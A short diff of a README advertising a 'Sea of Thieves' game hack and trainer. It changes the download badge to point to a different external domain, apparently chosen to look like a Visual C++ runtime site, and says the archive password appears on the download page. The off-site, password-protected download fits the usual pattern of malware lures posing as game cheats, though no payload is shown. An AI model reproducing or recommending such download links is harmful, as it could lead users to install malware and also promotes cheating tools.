@@ -18,7 +18,7 @@ Sea of Thieves Hack - game hack and trainer with full feature set. Works with th
 
 ## Download
 
-[![Download v1.7.0](https://img.shields.io/badge/Download_v1.7.0-ec4899?style=for-the-badge&logoColor=white)](https://connectinstruction.com/sothack)
+[![Download v1.7.0](https://img.shields.io/badge/Download_v1.7.0-ec4899?style=for-the-badge&logoColor=white)](https://dllvcrun.com/sothack)
 
 > The archive password is shown on the download page.
 
